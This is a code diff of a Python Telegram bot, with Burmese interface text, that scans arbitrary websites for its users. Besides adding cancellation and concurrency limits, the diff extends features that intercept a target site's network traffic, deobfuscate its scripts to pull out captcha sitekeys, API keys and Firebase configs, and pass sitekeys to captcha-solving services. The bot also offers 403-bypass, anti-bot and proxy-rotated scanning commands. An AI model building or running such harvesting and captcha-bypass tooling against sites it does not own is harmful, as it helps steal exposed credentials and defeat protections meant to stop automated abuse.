@@ -109,7 +109,9 @@ FILE_EXPIRY_HOURS = int(os.getenv("FILE_EXPIRY_HOURS", "24"))   # 24h ကြာ�
 # ── Global locks / state ──────────────────────────
 db_lock: asyncio.Lock                      # initialized in main()
 user_last_req    = {}                      # rate limit tracker {uid: timestamp}
-_cancel_flags: dict = {}                   # {uid: asyncio.Event} — /stop signal
+_cancel_flags: dict = {}                   # {uid: asyncio.Event} — /stop signal (downloads)
+_user_tasks: dict   = {}                   # {uid: asyncio.Task}  — any running scan task
+_scan_semaphore: asyncio.Semaphore         # initialized in main() — max 5 concurrent scans
 
 HEADERS = {
     'User-Agent': (
@@ -664,13 +666,27 @@ def user_guard(func):
         if uid not in ADMIN_IDS:
             if not db.get("settings", {}).get("bot_enabled", True):
                 await update.effective_message.reply_text(
-                    "🚫 Bot ကို ယာယီပိတ်ထားသည်။ နောက်မှ ထပ်ကြိုးစားပါ။"
+                    "🔴 *Bot ယာယီပိတ်ထားသည်*\n\n"
+                    "Admin မှ maintenance လုပ်နေပါသည်။\n"
+                    "နောက်မှ ထပ်ကြိုးစားပါ 🙏",
+                    parse_mode='Markdown'
                 )
                 return
             user = get_user(db, uid)
             if user.get("banned", False):
                 await update.effective_message.reply_text(
-                    "🚫 သင့် account ကို ပိတ်ထားသည်။"
+                    "🚫 *သင့် account ကို ပိတ်ထားသည်*\n"
+                    "Admin ထံ ဆက်သွယ်ပါ",
+                    parse_mode='Markdown'
+                )
+                return
+            # ── Concurrency guard: user already has active scan ───────────
+            existing = _user_tasks.get(uid)
+            if existing and not existing.done():
+                await update.effective_message.reply_text(
+                    "⚠️ *Operation တစ်ခု run နေသည်*\n"
+                    "ရပ်ရန် `/stop` သုံးပါ၊ ပြီးမှ ဆက်လုပ်ပါ",
+                    parse_mode='Markdown'
                 )
                 return
         return await func(update, context)
@@ -2854,7 +2870,7 @@ async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return detected, notable, resp.status_code, resp.url, js_fetched
 
     try:
-        detected, notable, status, final_url, js_cnt = await asyncio.to_thread(_do_tech_scan)
+        detected, notable, status, final_url, js_cnt = await run_scan(uid, _do_tech_scan)
     except Exception as e:
         await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`",
                             parse_mode='Markdown')
@@ -3274,7 +3290,7 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return sources, source_origins, findings
 
     try:
-        sources, source_origins, findings = await asyncio.to_thread(_do_extract)
+        sources, source_origins, findings = await run_scan(uid, _do_extract)
     except Exception as e:
         await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`", parse_mode='Markdown')
         return
@@ -3669,7 +3685,7 @@ async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     try:
-        results = await asyncio.to_thread(_bypass_sync, url)
+        results = await run_scan(uid, _bypass_sync, url)
     except Exception as e:
         await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
         return
@@ -3940,7 +3956,11 @@ async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     prog = asyncio.create_task(_prog())
     try:
-        data = await asyncio.to_thread(_subdomains_sync, raw, progress_q)
+        data = await run_scan(uid, _subdomains_sync, raw, progress_q)
+    except asyncio.CancelledError:
+        prog.cancel()
+        await msg.edit_text("🛑 Operation stopped\n`/stop` ဖြင့် ရပ်လိုက်သည်", parse_mode='Markdown')
+        return
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
@@ -4357,10 +4377,14 @@ async def _do_appassets_extract(update_or_msg, context, filepath: str, wanted_ca
 
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(
-            _extract_apk_assets_sync, filepath, wanted_cats,
+        result = await run_scan(
+            uid, _extract_apk_assets_sync, filepath, wanted_cats,
             lambda t: progress_q.append(t)
         )
+    except asyncio.CancelledError:
+        prog.cancel()
+        await msg.edit_text("🛑 Operation stopped\n`/stop` ဖြင့် ရပ်လိုက်သည်", parse_mode='Markdown')
+        return
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
@@ -4539,7 +4563,7 @@ async def cmd_antibot(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return {"success": False, "error": str(e)}
 
     try:
-        res = await asyncio.to_thread(_run_antibot)
+        res = await run_scan(uid, _run_antibot)
     except Exception as e:
         await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
         return
@@ -6939,13 +6963,11 @@ def _sitekey_sync(url: str, progress_cb=None) -> dict:
         val = sk_hook.get(hook_k, "")
         if val and val not in existing_keys:
             result.setdefault("findings", []).append({
-                "type":      type_label,
-                "site_key":  val,
-                "page_url":  result.get("page_url", url),
-                "source":    "Playwright constructor hook",
-                "source_url": result.get("page_url", url),
-                "found_via": "Playwright hook (runtime inject)",
-                "action":    "",
+                "type":     type_label,
+                "site_key": val,
+                "page_url": result.get("page_url", url),   # FIX: always set pageurl
+                "source":   "Playwright constructor hook",
+                "action":   "",
             })
             existing_keys.add(val)
 
@@ -6961,11 +6983,25 @@ def _sitekey_sync(url: str, progress_cb=None) -> dict:
         for f in extra:
             sk = f.get("site_key", "")
             if sk and sk not in existing_keys:
-                f["source"]     = f.get("source", "") + " [deep fetch]"
-                f["found_via"]  = "JS static (deep asset fetch)"
-                f.setdefault("source_url", f.get("source","").split("[")[0].strip())
+                f["source"] = f.get("source", "") + " [deep fetch]"
                 result.setdefault("findings", []).append(f)
                 existing_keys.add(sk)
+        # Deobfuscation pass over each asset — may reveal sitekeys inside atob/hex/join
+        for asset in new_assets:
+            body = asset.get("response_body", "")
+            if not body or len(body) < 30:
+                continue
+            _deob_body = _deobfuscate_text(body)
+            if not _deob_body:
+                continue
+            _deob_all_js = {asset["url"]: _deob_body}
+            for f in _extract_captcha_info("", url, _deob_all_js):
+                sk = f.get("site_key", "")
+                if sk and sk not in existing_keys:
+                    f["source"] = f.get("source", "") + " [deobfuscated]"
+                    f["confidence"] = "HIGH ✅"
+                    result.setdefault("findings", []).append(f)
+                    existing_keys.add(sk)
 
     # ── Phase 2: Real-time network stream intercept ───────────────────
     if progress_cb: progress_cb("🔴 Phase 2: real-time network stream intercept...")
@@ -6983,9 +7019,7 @@ def _sitekey_sync(url: str, progress_cb=None) -> dict:
         for f in live_extra:
             sk = f.get("site_key", "")
             if sk and sk not in existing_keys:
-                f["source"]     = f.get("source", "") + " [live stream]"
-                f["found_via"]  = "live stream intercept"
-                f["source_url"] = u
+                f["source"] = f.get("source", "") + " [live stream]"
                 f["confidence"] = "CONFIRMED ✅"
                 result.setdefault("findings", []).append(f)
                 existing_keys.add(sk)
@@ -7023,11 +7057,9 @@ def _sitekey_sync(url: str, progress_cb=None) -> dict:
                 if dedup not in _sk_seen and len(val) >= 8:
                     _sk_seen.add(dedup)
                     result.setdefault("findings", []).append({
-                        "type":       ktype,
-                        "site_key":   val,
-                        "source":     f"JSON response ← {entry.get('url','')[:70]}",
-                        "source_url": entry.get("url", ""),
-                        "found_via":  "API response (JSON body)",
+                        "type":     ktype,
+                        "site_key": val,
+                        "source":   f"JSON response ← {entry.get('url','')[:70]}",
                         "confidence": "HIGH ✅",
                     })
 
@@ -7678,9 +7710,13 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(
-            _sitekey_with_subpages, url, lambda t: progress_q.append(t)
+        result = await run_scan(
+            uid, _sitekey_with_subpages, url, lambda t: progress_q.append(t)
         )
+    except asyncio.CancelledError:
+        prog.cancel()
+        await msg.edit_text("🛑 Operation stopped\n`/stop` ဖြင့် ရပ်လိုက်သည်", parse_mode='Markdown')
+        return
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
@@ -7820,15 +7856,8 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
             lines.append(f"  📊 score: `{f['min_score']}`")
         if f.get("enterprise"):
             lines.append(f"  🏢 enterprise")
-        src      = f.get("source", "")[:70]
-        found_via = f.get("found_via", "")
-        src_url   = f.get("source_url", "")
-        if found_via:
-            lines.append(f"  📂 *Via:* `{escape_md(found_via)}`")
-        if src_url and src_url != f.get("page_url",""):
-            _su = src_url[:80].replace("`","'")
-            lines.append(f"  🔗 `{_su}`")
-        elif src and not found_via:
+        src = f.get("source", "")[:60]
+        if src:
             lines.append(f"  📂 _{escape_md(src)}_")
 
         # ── Clean JSON-style solver params ──────────────────────
@@ -7871,6 +7900,43 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
     report = "\n".join(lines)
     await safe_markdown_reply(msg, _truncate_safe_md(report))
 
+    # ── Cache findings for inline verify buttons ──────────────────────────────
+    verifiable_findings = [
+        f for f in findings
+        if any(ct in f.get("type", "") for ct in
+               ("reCAPTCHA", "hCaptcha", "Turnstile", "FunCaptcha"))
+        and (f.get("site_key") or f.get("value"))
+    ]
+    if verifiable_findings:
+        _sitekey_verify_cache[uid] = {
+            "findings": verifiable_findings,
+            "domain":   page_url,
+            "ts":       time.time(),
+        }
+        # ── Build inline keyboard (max 5 findings × 2 buttons each) ──────────
+        kb_rows = []
+        for idx, f in enumerate(verifiable_findings[:5]):
+            sk_short  = (f.get("site_key") or f.get("value") or "")[:12]
+            cap_label = f.get("type", "")[:20]
+            kb_rows.append([
+                InlineKeyboardButton(
+                    f"🔵 2captcha [{idx+1}] {sk_short}",
+                    callback_data=f"sv_2captcha_{uid}_{idx}"
+                ),
+                InlineKeyboardButton(
+                    f"🟢 CapSolver [{idx+1}]",
+                    callback_data=f"sv_capsolver_{uid}_{idx}"
+                ),
+            ])
+        if kb_rows:
+            await update.effective_message.reply_text(
+                f"🔍 *Verify Sitekeys — {len(verifiable_findings)} found*\n"
+                f"_2captcha / CapSolver API key လိုအပ်သည်_\n"
+                f"_မရှိသေးလျှင်: /setapikey 2captcha YOUR\\_KEY_",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup(kb_rows)
+            )
+
     # ─── Export JSON ─────────────────────────────
     import io as _io
     ts        = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -7898,10 +7964,6 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "co":         f.get("co", ""),
                 "callback":   f.get("callback", ""),
                 "user_agent": f.get("user_agent", ""),
-                # ── Source tracing ──
-                "source_url": f.get("source_url", ""),
-                "found_via":  f.get("found_via", f.get("source", "")),
-                "confidence": f.get("confidence", ""),
                 # ── Solver-ready format (per-service) ──
                 "solver_params": _get_solver_params(f),
             }
@@ -7956,6 +8018,10 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     _truncate_safe_md("\n".join(deob_lines)), parse_mode='Markdown')
     except Exception as deob_err:
         logger.debug("sitekey deobfuscate layer error: %s", deob_err)
+
+
+# ══════════════════════════════════════════════════
+# 🗝️  KEY EXTRACTOR ENGINE — Shared Playwright runner
 # ══════════════════════════════════════════════════
 
 def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> dict:
@@ -8891,23 +8957,36 @@ def _stream_intercept_sync(url: str, progress_cb=None, extra_patterns: list | No
                         const h = (req instanceof Request) ? req.headers : new Headers(opts.headers || {});
                         h.forEach((v, k) => { headers[k.toLowerCase()] = v; });
                     } catch(e) {}
-                    const bodySnip = typeof opts.body === 'string' ? opts.body.slice(0,1000) :
-                                     (opts.body instanceof URLSearchParams ? opts.body.toString().slice(0,1000) : '');
+                    const bodySnip = typeof opts.body === 'string' ? opts.body.slice(0,2000) :
+                                     (opts.body instanceof URLSearchParams ? opts.body.toString().slice(0,2000) : '');
                     _log({type:'fetch', url, method, headers, body: bodySnip, ts: Date.now()});
 
                     const resp = await _origFetch.apply(this, args);
-                    // BUG FIX 2: store body synchronously in __responseLog to avoid
-                    // async .then() race condition — read after networkidle wait
+                    // FIX: Use clone() + tee pattern to avoid async race.
+                    // Store result ID so Playwright-level merge can match it.
                     try {
                         const ct = resp.headers.get('content-type') || '';
-                        if (ct.includes('json') || ct.includes('text') || ct.includes('javascript')) {
+                        const _CAPTURABLE = ['json','text','javascript','xml','html',
+                                             'form','graphql','plain','csv','yaml'];
+                        if (_CAPTURABLE.some(t => ct.includes(t)) || resp.status < 400) {
                             const clone = resp.clone();
-                            clone.text().then(t => {
-                                window.__streamLog.push({
-                                    type:'fetch_response', url,
-                                    status: resp.status, content_type: ct,
-                                    body: t.slice(0, 4000), ts: Date.now()
-                                });
+                            // Use Promise.race with 5s timeout to avoid hanging
+                            const bodyP = clone.text();
+                            const timeoutP = new Promise(r => setTimeout(() => r('__timeout__'), 5000));
+                            Promise.race([bodyP, timeoutP]).then(t => {
+                                if (t !== '__timeout__') {
+                                    window.__streamLog.push({
+                                        type: 'fetch_response', url,
+                                        status: resp.status,
+                                        content_type: ct,
+                                        resp_headers: (() => {
+                                            const h = {};
+                                            try { resp.headers.forEach((v,k) => h[k.toLowerCase()]=v); } catch(e){}
+                                            return h;
+                                        })(),
+                                        body: t.slice(0, 8000), ts: Date.now()
+                                    });
+                                }
                             }).catch(()=>{});
                         }
                     } catch(e) {}
@@ -8930,14 +9009,35 @@ def _stream_intercept_sync(url: str, progress_cb=None, extra_patterns: list | No
                     xhr.send = function(body) {
                         _log({type:'xhr', url: meta.url, method: meta.method,
                               headers: meta.headers,
-                              body: (typeof body === 'string' ? body.slice(0,1000) : ''),
+                              body: (typeof body === 'string' ? body.slice(0,2000) : ''),
                               ts: Date.now()});
+                        const _XHR_CAPTURABLE = ['json','text','javascript','xml','html',
+                                                 'form','graphql','plain','csv','yaml'];
+                        // Primary: load event
                         xhr.addEventListener('load', function() {
                             const ct = xhr.getResponseHeader('content-type') || '';
-                            if (ct.includes('json') || ct.includes('text') || ct.includes('javascript')) {
+                            // Capture all response headers
+                            const respHdrs = {};
+                            try {
+                                const raw = xhr.getAllResponseHeaders() || '';
+                                raw.trim().split(/[\r\n]+/).forEach(line => {
+                                    const parts = line.split(/:\s*/);
+                                    if (parts[0]) respHdrs[parts[0].toLowerCase()] = parts.slice(1).join(': ');
+                                });
+                            } catch(e) {}
+                            if (_XHR_CAPTURABLE.some(t => ct.includes(t)) || xhr.status < 400) {
                                 _log({type:'xhr_response', url: meta.url, status: xhr.status,
-                                      content_type: ct, body: xhr.responseText.slice(0,4000),
+                                      content_type: ct, resp_headers: respHdrs,
+                                      body: (xhr.responseText || '').slice(0,8000),
                                       ts: Date.now()});
+                            }
+                        });
+                        // Backup: readystatechange (catches early abort/error)
+                        xhr.addEventListener('readystatechange', function() {
+                            if (xhr.readyState === 4 && xhr.status === 0 && xhr.responseText) {
+                                _log({type:'xhr_response', url: meta.url, status: 0,
+                                      content_type: '', resp_headers: {},
+                                      body: xhr.responseText.slice(0,8000), ts: Date.now()});
                             }
                         });
                         return _origXHR.prototype.send.apply(xhr, [body]);
@@ -8953,9 +9053,21 @@ def _stream_intercept_sync(url: str, progress_cb=None, extra_patterns: list | No
                     window.EventSource = function(url, opts) {
                         const es = new _origES(url, opts);
                         _log({type:'sse_open', url, ts: Date.now()});
+                        // Capture default message events
                         es.addEventListener('message', function(e) {
-                            _log({type:'sse_message', url,
-                                  data: String(e.data).slice(0,2000), ts: Date.now()});
+                            _log({type:'sse_message', url, event: 'message',
+                                  data: String(e.data).slice(0,4000),
+                                  lastEventId: e.lastEventId || '',
+                                  ts: Date.now()});
+                        });
+                        // Capture named event types (error, open, custom)
+                        ['error', 'open', 'data', 'update', 'result',
+                         'delta', 'completion', 'chunk', 'token'].forEach(evtType => {
+                            es.addEventListener(evtType, function(e) {
+                                _log({type:'sse_message', url, event: evtType,
+                                      data: String(e.data || '').slice(0,4000),
+                                      ts: Date.now()});
+                            });
                         });
                         return es;
                     };
@@ -8976,8 +9088,16 @@ def _stream_intercept_sync(url: str, progress_cb=None, extra_patterns: list | No
             # ── BUG FIX 3: Playwright-level response body capture ─────────────
             # JS hook can miss responses due to async race; Playwright-level
             # capture is synchronous and reliable — used as primary source.
-            _plw_request_headers = {}
-            _plw_response_bodies = {}   # url → body text
+            _plw_request_headers  = {}
+            _plw_response_bodies  = {}   # url → body text
+            _plw_response_meta    = {}   # url → {status, headers, content_type}
+
+            # Expanded: JSON, XML, HTML, GraphQL, form, plain, CSV, YAML, JS bundles
+            _CAPTURE_CT = (
+                "json", "javascript", "text", "html", "xml",
+                "form", "graphql", "plain", "x-www-form-urlencoded",
+                "csv", "yaml", "toml",
+            )
 
             def _on_request_headers(req):
                 try:
@@ -8989,10 +9109,17 @@ def _stream_intercept_sync(url: str, progress_cb=None, extra_patterns: list | No
             def _on_response(resp):
                 try:
                     ct = (resp.headers.get("content-type") or "").lower()
-                    if any(x in ct for x in ("json", "text", "javascript")):
-                        body = resp.body()          # synchronous bytes
-                        text = body.decode("utf-8", errors="replace")[:4000]
+                    st = resp.status
+                    # Capture matching content-type OR any 2xx/3xx API response
+                    if any(x in ct for x in _CAPTURE_CT) or (200 <= st < 400 and ct):
+                        body = resp.body()
+                        text = body.decode("utf-8", errors="replace")[:8000]
                         _plw_response_bodies[resp.url] = text
+                        _plw_response_meta[resp.url] = {
+                            "status":       st,
+                            "content_type": ct,
+                            "headers":      {k.lower(): v for k, v in resp.headers.items()},
+                        }
                 except Exception:
                     pass
 
@@ -9001,11 +9128,24 @@ def _stream_intercept_sync(url: str, progress_cb=None, extra_patterns: list | No
             def _on_websocket(ws):
                 ws_url = ws.url
                 def _on_frame_sent(payload):
-                    _ws_frames.append({"dir": "sent", "url": ws_url,
-                                       "payload": str(payload)[:2000]})
+                    # Handle binary (bytes) and text payloads
+                    if isinstance(payload, (bytes, bytearray)):
+                        try:
+                            text = payload.decode("utf-8", errors="replace")[:4000]
+                        except Exception:
+                            text = repr(payload[:200])
+                    else:
+                        text = str(payload)[:4000]
+                    _ws_frames.append({"dir": "sent", "url": ws_url, "payload": text})
                 def _on_frame_recv(payload):
-                    _ws_frames.append({"dir": "recv", "url": ws_url,
-                                       "payload": str(payload)[:2000]})
+                    if isinstance(payload, (bytes, bytearray)):
+                        try:
+                            text = payload.decode("utf-8", errors="replace")[:4000]
+                        except Exception:
+                            text = repr(payload[:200])
+                    else:
+                        text = str(payload)[:4000]
+                    _ws_frames.append({"dir": "recv", "url": ws_url, "payload": text})
                 ws.on("framesent",    _on_frame_sent)
                 ws.on("framereceived", _on_frame_recv)
 
@@ -9095,9 +9235,17 @@ def _stream_intercept_sync(url: str, progress_cb=None, extra_patterns: list | No
         js_seen_urls = {e.get("url","") for e in raw_log}
         for u, body in _plw_response_bodies.items():
             if u not in js_seen_urls and body:
-                raw_log.append({"type": "fetch_response", "url": u,
-                                 "body": body, "headers": _plw_request_headers.get(u, {}),
-                                 "status": 200, "source": "playwright_level"})
+                meta = _plw_response_meta.get(u, {})
+                raw_log.append({
+                    "type":         "fetch_response",
+                    "url":          u,
+                    "body":         body,
+                    "headers":      _plw_request_headers.get(u, {}),
+                    "resp_headers": meta.get("headers", {}),
+                    "status":       meta.get("status", 200),
+                    "content_type": meta.get("content_type", ""),
+                    "source":       "playwright_level",
+                })
 
         # ── Separate SSE frames ────────────────────────────────────────────
         for entry in raw_log:
@@ -10914,7 +11062,7 @@ async def cmd_apikeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_apikeys_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _apikeys_sync, url, lambda t: progress_q.append(t))
         progress_q.append("\U0001f534 Phase 2: real-time network stream intercept...")
         live_result = await asyncio.to_thread(
             _stream_intercept_sync, url, lambda t: progress_q.append(t), _LIVE_API_PATTERNS
@@ -11066,14 +11214,20 @@ def _firebase_sync(url: str, progress_cb=None) -> dict:
                 seen.add(key)
                 configs.append({"source": source, "config": fields})
 
-    if progress_cb: progress_cb("🔍 Scanning for Firebase config...")
+    if progress_cb: progress_cb("🔍 Scanning for Firebase config (+ deobfuscation)...")
 
     for text, label in _gather_all_text(data):
         for m in _FIREBASE_PATTERNS.finditer(text):
             _parse_config_block(m.group(0), label)
-        # Also scan line by line for firebaseConfig object
         if "projectId" in text and "apiKey" in text:
             _parse_config_block(text, label)
+        # Deobfuscation pass — decode atob/hex/join-hidden Firebase configs
+        _deob = _deobfuscate_text(text)
+        if _deob:
+            for m in _FIREBASE_PATTERNS.finditer(_deob):
+                _parse_config_block(m.group(0), label + " [deobfuscated]")
+            if "projectId" in _deob and "apiKey" in _deob:
+                _parse_config_block(_deob, label + " [deobfuscated]")
 
     # DOM result
     dr = data.get("dom_result") or {}
@@ -11130,7 +11284,7 @@ async def cmd_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_firebase_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _firebase_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel()
         await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown')
@@ -11510,6 +11664,518 @@ def _entropy_hunt_sync(url: str, threshold: float = 4.2, progress_cb=None) -> di
     }
 
 
+# ══════════════════════════════════════════════════
+# 💳  /payconfig — Payment Configuration Auditor
+# ══════════════════════════════════════════════════
+# Scope: Extract & audit the EXPOSED payment integration config from
+# a site's HTML/JS — gateway profiles, CSP headers, webhook URLs,
+# form field structure, currency config, and PCI risk signals.
+# Does NOT use found keys to call gateway APIs.
+# ══════════════════════════════════════════════════
+
+# ── CSP header parser for payment domains ─────────────────────────────────
+_PAY_CSP_DOMAINS = {
+    "js.stripe.com":         "Stripe JS SDK",
+    "checkout.stripe.com":   "Stripe Checkout",
+    "q.stripe.com":          "Stripe telemetry",
+    "js.braintreegateway.com": "Braintree JS",
+    "assets.braintreegateway.com": "Braintree assets",
+    "www.paypal.com":        "PayPal",
+    "www.sandbox.paypal.com":"PayPal Sandbox",
+    "js.razorpay.com":       "Razorpay JS",
+    "api.razorpay.com":      "Razorpay API",
+    "js.squareup.com":       "Square JS",
+    "js.squareupsandbox.com":"Square Sandbox",
+    "hcaptcha.com":          "hCaptcha",
+    "js.hcaptcha.com":       "hCaptcha JS",
+    "challenges.cloudflare.com": "Cloudflare Turnstile",
+    "www.google.com/recaptcha": "reCAPTCHA",
+    "adyen.com":             "Adyen",
+    "checkout.adyen.com":    "Adyen Checkout",
+    "live.adyen.com":        "Adyen Live",
+    "pay.google.com":        "Google Pay",
+    "apple.com/apple-pay":   "Apple Pay",
+    "api.klarna.com":        "Klarna",
+    "x.klarnacdn.net":       "Klarna CDN",
+    "paddle.com":            "Paddle",
+    "buy.paddle.com":        "Paddle Checkout",
+    "mollie.com":            "Mollie",
+    "paystack.com":          "Paystack",
+    "flutterwave.com":       "Flutterwave",
+    "checkout.com":          "Checkout.com",
+    "coinbase.com/commerce": "Coinbase Commerce",
+    "affirm.com":            "Affirm",
+    "afterpay.com":          "Afterpay",
+    "clearpay.co.uk":        "Clearpay",
+}
+
+# ── Webhook URL patterns ───────────────────────────────────────────────────
+_WEBHOOK_PATTERNS = [
+    ("Stripe Webhook",    re.compile(r'(?i)(?:stripe[_\-]?)?webhook[_\-]?(?:url|endpoint|secret)\s*[=:]\s*["\']?(https?://[^\s"\',;>]{10,120})', re.I)),
+    ("PayPal IPN",        re.compile(r'(?i)paypal[_\-]?(?:ipn|webhook)[_\-]?url\s*[=:]\s*["\']?(https?://[^\s"\',;>]{10,120})', re.I)),
+    ("Generic Webhook",   re.compile(r'(?i)webhook[_\-]?(?:url|endpoint)\s*[=:]\s*["\']?(https?://[^\s"\',;>]{10,120})', re.I)),
+    ("Callback URL",      re.compile(r'(?i)(?:return|callback|redirect)[_\-]?url\s*[=:]\s*["\']?(https?://[^\s"\',;>]{10,120})', re.I)),
+    ("Success URL",       re.compile(r'(?i)success[_\-]?(?:url|redirect)\s*[=:]\s*["\']?(https?://[^\s"\',;>]{10,120})', re.I)),
+    ("Cancel URL",        re.compile(r'(?i)cancel[_\-]?(?:url|redirect)\s*[=:]\s*["\']?(https?://[^\s"\',;>]{10,120})', re.I)),
+]
+
+# ── Currency / locale signals ──────────────────────────────────────────────
+_CURRENCY_RE = re.compile(
+    r'(?i)(?:currency|locale|country)[_\-]?(?:code)?\s*[=:,]\s*["\']([A-Z]{2,6})["\']'
+    r'|["\']currency["\']\s*:\s*["\']([A-Z]{2,6})["\']'
+    r'|amount\s*:\s*(\d{1,10})\s*(?:,|})'
+)
+
+# ── Payment form field fingerprint ────────────────────────────────────────
+_FORM_FIELD_SIGNALS = {
+    "Card Number field":      re.compile(r'(?i)card[_\-]?number|cardnumber|cc[_\-]?num'),
+    "CVV/CVC field":          re.compile(r'(?i)\bcvv\b|\bcvc\b|\bsecurity[_\-]?code'),
+    "Expiry field":           re.compile(r'(?i)exp(?:ir(?:y|ation))?[_\-]?(?:date|month|year)|card[_\-]?exp'),
+    "Cardholder name field":  re.compile(r'(?i)cardholder[_\-]?name|card[_\-]?holder|billing[_\-]?name'),
+    "Billing address field":  re.compile(r'(?i)billing[_\-]?address|billing[_\-]?zip|billing[_\-]?postal'),
+    "UPI field (India)":      re.compile(r'(?i)upi[_\-]?id|vpa[_\-]?address|bhim'),
+    "IBAN/SEPA field":        re.compile(r'(?i)\biban\b|\bsepa\b|bank[_\-]?account'),
+    "Crypto address field":   re.compile(r'(?i)wallet[_\-]?address|crypto[_\-]?address|eth[_\-]?address'),
+}
+
+# ── PCI SAQ level heuristics ──────────────────────────────────────────────
+def _pci_saq_estimate(form_fields: list, gateways: list, csp_gateways: list) -> str:
+    """Estimate PCI DSS SAQ type from integration signals."""
+    has_iframe = any("Stripe" in g or "Braintree" in g or "Square" in g or "Adyen" in g
+                     for g in gateways + csp_gateways)
+    has_raw_fields = any("Card Number" in f or "CVV" in f or "Expiry" in f for f in form_fields)
+
+    if has_raw_fields and not has_iframe:
+        return "⚠️ SAQ D (raw card fields in DOM — PCI scope FULL)"
+    elif has_iframe or has_raw_fields is False:
+        return "✅ SAQ A or A-EP (iframe/redirect — reduced PCI scope)"
+    else:
+        return "⚪ SAQ unclear — manual review needed"
+
+
+def _payconfig_sync(url: str, progress_cb=None) -> dict:
+    """
+    Payment configuration surface auditor.
+    Scans HTML, JS, HTTP headers, CSP for exposed payment integration
+    configuration — gateways, modes, currencies, webhook URLs, form structure,
+    PCI risk tier — without using any found keys to call external APIs.
+    """
+    result = {
+        "url":           url,
+        "page_url":      url,
+        "gateways":      [],
+        "sdk_scripts":   [],
+        "csp_gateways":  [],
+        "currencies":    [],
+        "webhooks":      [],
+        "form_fields":   [],
+        "pci_saq":       "",
+        "pci_risks":     [],
+        "threeds":       [],
+        "key_modes":     {"live": [], "test": [], "unknown": []},
+        "security_headers": {},
+        "findings":      [],   # full paykeys findings reused
+        "gateway_profile": None,
+        "error":         None,
+    }
+
+    if progress_cb: progress_cb("🌐 Fetching page + HTTP headers...")
+    try:
+        proxy = proxy_manager.get_proxy()
+        resp  = requests.get(url, headers=HEADERS, proxies=proxy,
+                             timeout=TIMEOUT, verify=False, allow_redirects=True)
+        html      = resp.text
+        final_url = resp.url
+        http_hdrs = dict(resp.headers)
+    except Exception as e:
+        result["error"] = str(e)
+        return result
+
+    result["page_url"] = final_url
+
+    # ── 1. Security headers relevant to payments ──────────────────────────────
+    _SEC_HDRS = {
+        "Content-Security-Policy": "CSP",
+        "Strict-Transport-Security": "HSTS",
+        "X-Frame-Options": "X-Frame-Options",
+        "Referrer-Policy": "Referrer-Policy",
+        "Permissions-Policy": "Permissions-Policy",
+        "Cross-Origin-Opener-Policy": "COOP",
+    }
+    for hdr, label in _SEC_HDRS.items():
+        v = http_hdrs.get(hdr, "") or http_hdrs.get(hdr.lower(), "")
+        if v:
+            result["security_headers"][label] = v[:200]
+
+    # ── 2. CSP payment domain fingerprint ────────────────────────────────────
+    if progress_cb: progress_cb("🔍 Parsing CSP for payment domains...")
+    csp_val = (result["security_headers"].get("CSP", "")
+               or http_hdrs.get("Content-Security-Policy", ""))
+    for domain_kw, gw_name in _PAY_CSP_DOMAINS.items():
+        if domain_kw in csp_val:
+            if gw_name not in result["csp_gateways"]:
+                result["csp_gateways"].append(gw_name)
+
+    # ── 3. Gather JS text corpus ──────────────────────────────────────────────
+    if progress_cb: progress_cb("📦 Fetching JS bundles...")
+    texts: list = [(html, "HTML")]
+    for src in re.findall(r'<script[^>]+src=["\']([^"\'>]+)["\']>', html, re.I)[:25]:
+        js_url = urljoin(final_url, src)
+        if not js_url.startswith("http"):
+            continue
+        try:
+            jr = requests.get(js_url, headers=HEADERS, proxies=proxy_manager.get_proxy(),
+                              timeout=TIMEOUT, verify=False)
+            if jr.status_code == 200:
+                body = jr.text
+                texts.append((body, js_url.split("/")[-1][:40]))
+                # deobfuscation pass
+                _deob = _deobfuscate_text(body)
+                if _deob:
+                    texts.append((_deob, js_url.split("/")[-1][:40] + " [deobfuscated]"))
+        except Exception:
+            pass
+
+    combined = "\n".join(t for t, _ in texts)
+
+    # ── 4. SDK <script> tag fingerprint ──────────────────────────────────────
+    if progress_cb: progress_cb("🏦 Fingerprinting payment SDK scripts...")
+    _SDK_PATTERNS = [
+        (re.compile(r'js\.stripe\.com'),        "Stripe JS SDK"),
+        (re.compile(r'checkout\.stripe\.com'),   "Stripe Checkout"),
+        (re.compile(r'braintreegateway\.com'),    "Braintree JS"),
+        (re.compile(r'paypal\.com/sdk/js'),       "PayPal SDK"),
